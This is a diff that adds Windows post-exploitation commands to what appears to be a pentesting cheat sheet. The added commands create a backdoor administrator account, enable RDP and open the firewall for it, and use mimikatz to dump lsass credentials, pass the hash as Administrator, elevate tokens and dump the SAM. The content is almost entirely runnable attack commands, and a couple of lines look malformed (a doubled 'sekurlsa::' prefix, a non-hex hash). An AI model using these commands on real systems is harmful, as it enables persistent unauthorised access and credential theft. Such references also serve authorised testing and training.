@@ -1495,3 +1495,56 @@ and now we can run `klist` in order to print the current available tickets
 ```
 klist
 ```
+
+**Add RDP users**
+
+```
+net user backdoor password123! /add
+net localgroup administrators backdoor /add
+net localgroup "Remote Desktop Users" backdoor /add
+```
+
+**Enable RDP**
+
+```
+via registry
+
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+
+Add firewall policy
+
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+```
+
+**Password and hash Extract passwords, keys, pin codes, tickets from lsass memory**
+
+```
+privilege::debug log sekurlsa.log sekurlsa::logonpasswords
+```
+
+Pass-the-hash
+
+```
+
+privilege::debug 
+log sekurlsa.log 
+sekurlsa::sekurlsa::pth /user:Administrator /domain:acme /ntlm:893efccda23744616cf7accab23ascbb /run:cmd
+```
+
+Elevate token
+
+```
+privilege::debug 
+log sekurlsa.log 
+token::elevate
+```
+
+Dump SAM
+
+```
+privilege::debug 
+log sekurlsa.log 
+lsadump::sam
+```
+
